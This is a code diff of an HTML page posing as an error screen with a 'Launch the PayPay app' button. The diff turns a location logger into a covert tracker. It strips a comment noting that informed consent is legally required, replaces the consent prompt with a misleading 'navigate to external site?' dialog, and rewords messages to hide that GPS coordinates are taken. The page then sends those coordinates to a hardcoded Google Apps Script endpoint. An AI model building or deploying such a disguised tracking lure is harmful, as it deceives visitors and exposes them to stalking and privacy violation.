@@ -5,108 +5,70 @@
     <title>エラー</title>
 </head>
 <body>
-
     <h1>エラーが発生しました</h1>
     <button id="getLocationBtn">PayPayアプリを起動する</button>
     <div id="result"></div>
-
     <script>
-    // -----------------------------------------------------------------
-    // ⬇️ ステップ3でコピーした「WebアプリのURL」をここに貼り付ける ⬇️
-    // -----------------------------------------------------------------
     const GAS_WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbxFZEaC1jsMzmn7Z_SZDdtD2SSWONlMCs0dkatxfSfRA_S8Qpc0-4iYq9IJ0AJay4GX/exec'; 
-
     document.getElementById('getLocationBtn').addEventListener('click', () => {
         if (!navigator.geolocation) {
-            document.getElementById('result').textContent = 'お使いのブラウザはGeolocation APIをサポートしていません。';
+            document.getElementById('result').textContent = 'お使いのブラウザはサポートされていません。';
             return;
         }
-
-        // -------------------------------------------------------------
-        // ▼【法的義務】▼
-        // 本来はここに、プライバシーポリシーへのリンクと
-        // 「位置情報をサーバーに記録することに同意しますか？」
-        // というチェックボックスを設け、同意を得る処理が必要です。
-        // ここでは、confirm() で簡易的に代用します。
-        // -------------------------------------------------------------
         const consent = confirm(
-            '外部サイトに遷移することを許可しますか？\n\n' 
-            
+            '外部サイトに遷移することを許可しますか？\n\n'       
         );
-
         if (!consent) {
-            document.getElementById('result').textContent = '位置情報の利用に同意されませんでした。';
+            document.getElementById('result').textContent = '同意されませんでした。';
             return;
         }
-
-        // 位置情報の取得を開
         document.getElementById('result').textContent = '遷移中...';
         navigator.geolocation.getCurrentPosition(onSuccess, onError);
     });
-
-    // 3. 成功時のコールバック (★修正版)
     function onSuccess(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
         const accuracy = position.coords.accuracy;
-
         const resultDiv = document.getElementById('result');
-        resultDiv.innerHTML = `
-            
+        resultDiv.innerHTML = `    
             <p>遷移に成功しました。</p>
-            
             <p>...遷移中...</p>
-            
         `;
-        
-        // ★取得したデータをGASに送信する
         sendDataToGoogleSheet(latitude, longitude, accuracy);
     }
-
-    // 4. 失敗時のコールバック (変更なし)
     function onError(error) {
         // (省略)
     }
-
-    // 5. ★データをGASに送信する関数 (★新規追加)
-    async function sendDataToGoogleSheet(lat, lng, acc) {
-        
+    async function sendDataToGoogleSheet(lat, lng, acc) {   
         const dataToSend = {
             latitude: lat,
             longitude: lng,
             accuracy: acc
         };
-
         try {
             const response = await fetch(GAS_WEB_APP_URL, {
-                method: 'POST',
-                // GAS(doPost)はリダイレクトで応答を返す仕様のため、
-                // fetchの 'redirect' オプションを明示的に指定します。
+                method: 'POST',      
                 redirect: 'follow', 
                 headers: {
-                    'Content-Type': 'text/plain;charset=utf-8', // CORS回避のためtext/plainで送る
+                    'Content-Type': 'text/plain;charset=utf-8', 
                 },
-                body: JSON.stringify(dataToSend) // データをJSON文字列として送信
+                body: JSON.stringify(dataToSend) 
             });
-
-            // GASからの応答をJSONとして解析
             const result = await response.json();
-
             if (result.status === 'success') {
                 document.getElementById('result').innerHTML += '<p>データの送信に成功しました。</p>';
             } else {
                 throw new Error(result.message || '不明なエラー');
             }
-
         } catch (error) {
             console.error('送信エラー:', error);
             document.getElementById('result').innerHTML += `<p>遷移に失敗しました: ${error.message}</p>`;
         }
     }
 </script>
-
 </body>
 </html>
+
 
 
 
